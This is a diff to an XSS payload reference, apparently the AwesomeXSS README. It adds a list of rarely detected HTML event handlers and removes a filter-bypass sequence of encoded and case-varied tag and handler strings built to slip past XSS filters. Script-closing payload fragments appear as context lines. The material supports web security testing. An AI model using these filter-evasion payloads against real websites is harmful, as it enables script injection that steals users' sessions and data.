@@ -115,6 +115,15 @@ Explanation of how it works, [here](https://github.com/s0md3v/AwesomeXSS/blob/ma
 - [105 Event Handlers with description](https://github.com/UltimateHackers/AwesomeXSS/blob/master/Database/event-handlers.md)
 - [200 Event Handlers without description](http://pastebin.com/raw/WwcBmz5J)
 
+Some less detected event handlers
+```
+ontoggle
+onauxclick
+ondblclick
+oncontextmenu
+onmouseleave
+ontouchcancel
+```
 
 Some HTML Tags that you will be using
 ```
@@ -283,34 +292,6 @@ If the your dummy tags lands in the source code as it is, go for any of these pa
 </script
 </script/>
 </script x>
-```
-
-**Filter bypass procedure by [Rodolfo Assis](https://twitter.com/rodoassis)**
-```
-<x onxxx=1
-%3Cx onxxx=1
-<%78 onxxx=1
-<x %6Fnxxx=1
-<x o%6Exxx=1
-<x on%78xx=1
-<x onxxx%3D1
-<X onxxx=1
-<x ONxxx=1
-<x OnXxx=1
-<X OnXxx=1
-<x onxxx=1 onxxx=1
-<x/onxxx=1
-<x%09onxxx=1
-<x%0Aonxxx=1
-<x%0Conxxx=1
-<x%0Donxxx=1
-<x%2Fonxxx=1
-<x 1='1'onxxx=1
-<x 1="1"onxxx=1
-<x </onxxx=1
-<x 1=">" onxxx=1
-<http://onxxx%3D1/
-<x%2F1=">%22OnXxx%3D1
 ```
 
 ### Awesome Encoding
